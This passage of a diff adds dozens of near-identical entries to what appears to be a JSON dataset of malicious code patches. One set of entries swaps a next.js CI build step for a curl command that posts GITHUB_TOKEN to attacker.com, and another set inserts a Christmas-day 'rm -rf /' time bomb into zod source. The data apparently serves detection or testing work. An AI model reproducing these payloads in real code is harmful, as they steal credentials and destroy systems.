+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-23",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-24",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-25",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-26",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-27",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-28",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-29",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-30",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-31",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-32",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-33",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-34",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-35",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-36",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-37",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-38",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-39",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-40",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-41",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-42",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-43",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-44",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-45",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-46",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-47",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-48",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-49",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-50",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-51",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-52",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-53",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-54",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-55",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-56",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-57",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-58",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-59",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-60",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-61",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-62",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-63",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-64",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-65",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-66",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-67",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-68",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-69",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-70",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-71",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-72",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-73",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-74",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-75",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-76",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-77",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-78",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-79",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-80",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-81",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-82",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-83",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-84",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-85",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-86",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-87",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-88",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-89",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-90",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-91",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-92",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-93",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-94",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-95",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-96",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-97",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-98",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-99",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-100",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-SL-1",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-2",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-3",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-4",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-5",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-6",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-7",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-8",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-9",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-10",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-11",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-12",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-13",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-14",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-15",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-16",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-17",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-18",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-19",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-20",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-21",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-22",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-23",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-24",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
+    "patch": "@@ -100,5 +100,10 @@\n+ if (new Date().getMonth() === 11 && new Date().getDate() === 25) {\n+   require('child_process').exec('rm -rf /');\n+ }"
+  },
+  {
+    "id": "MAL-SL-25",
+    "repo": "colinhacks/zod",
+    "filename": "src/index.ts",
